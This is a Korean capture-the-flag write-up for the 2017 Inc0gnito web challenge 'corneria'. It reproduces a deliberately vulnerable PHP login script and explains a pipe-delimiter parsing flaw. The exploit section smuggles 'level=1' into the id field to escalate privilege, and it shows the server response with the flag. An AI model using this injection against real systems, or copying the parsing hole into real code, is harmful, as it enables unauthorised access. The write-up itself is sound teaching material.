# [2017_Inc0gnito] \[WEB] corneria

### Problem

문제 서버 - http://prob.nagi.moe:9095/

```php
<?php 
define("FLAG","flag{????????????}");

class info{
	var $_;

	public function __get($name){
		return $this->$name;

	}
	function ______($____){
		$_ = array_reverse(explode("|",$____));

		foreach($_ as $__){
			$___=explode("=",$__);

			if($___[0]==='id')
				$this->_['id']=$___[1];

			else if($___[0]==='level')
				$this->_['authLevel']=(int)$___[1];

			else if($___[0]==='pw'){
				$this->_['pw']=$___[1];
			}
		}
	}

	function _____(){
		return $this->_['pw'];

	}
	function ___(){
		return $this->_['id'];

	}
	function ____(){
		return $this->_['authLevel'];

	}
	public function __construct(){
		$this->_['id']="default";

		$this->_['authLevel']=(int)0;

		$this->_['pw']=md5("default_passwd");

	}
	function __($a){
		$_=rand(0,getrandmax());
		$_=md5((string)$_.$a);
		return $_;
	}
}
$i=new info;
if(isset($_POST['id'])&&isset($_POST['pw'])){
	$__=true;
	$___=md5($_POST['pw']);
	$____=$_POST['id'];
	if(($___)==="is_this_really_md5?"){$_____=1;
	}else{$_____=0;
	}$______=array();
	$______['id'] = "id=".$____;
	$______['level'] = "level=".$_____;
	$______['pw']="pw=".$i->__($___);
	$_______=implode("|",$______);
	$i->______($_______);
	if($i->____()===1){
		echo FLAG;
	}
}
else{
	$__=false;
}
	?>
	<html><head><title>My auth site</title></head><body><h4>Hello <?php if($__) echo ", ".$i->___();
	?></h4><?php if($__){echo "Your ID : ".$i->___()."<br>Your Level : ".$i->____()."<br>Your password : ".$i->_____()."<br>";
}else{echo "<form method='post' action='".$_SERVER['PHP_SELF']."'>ID : <input type = 'text' name='id' /><br>PW : <input type = 'password' name='pw' /><br><input type='submit' /></form>";
}?></body></html>
```

원래는 주어진 소스코드가 한줄로 이뤄져있고 변수명도 이상하게 되어 있습니다. 이것을 대충 보기 좋게 만들면 위와 같습니다. 변수를 받아서 어떤 과정을 통해 처리하는 것으로 보입니다.



### 취약점

```php
	function ______($____){
		$_ = array_reverse(explode("|",$____));

		foreach($_ as $__){
			$___=explode("=",$__);

			if($___[0]==='id')
				$this->_['id']=$___[1];

			else if($___[0]==='level')
				$this->_['authLevel']=(int)$___[1];

			else if($___[0]==='pw'){
				$this->_['pw']=$___[1];
			}
		}
	}
```

취약점은 이 부분에서 발생합니다. 변수를 `|`단위로 나눠주는데 만약 사용자의 입력값에 `|`가 있으면 뒤의 내용을 변수로 받아들일 수 있습니다. 



### Exploit

FLAG를 출력해주려면 level 값을 1로 변경해주면 됩니다.

```
$ http -f POST http://prob.nagi.moe:9095/ id="aaa|level=1" pw=bbb
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 184
Content-Type: text/html; charset=UTF-8
Date: Fri, 25 Aug 2017 03:28:51 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.10 (Ubuntu)
Vary: Accept-Encoding

INC0{just_consider_it_done}<html>
	<head>
		<title>My auth site</title>
	</head>
	<body>
		<h4>Hello , aaa</h4>
		Your ID : aaa<br>Your Level : 1<br>Your password : 08f8e0260c64418510cefb2b06eee5cd<br>	</body>
</html>
```

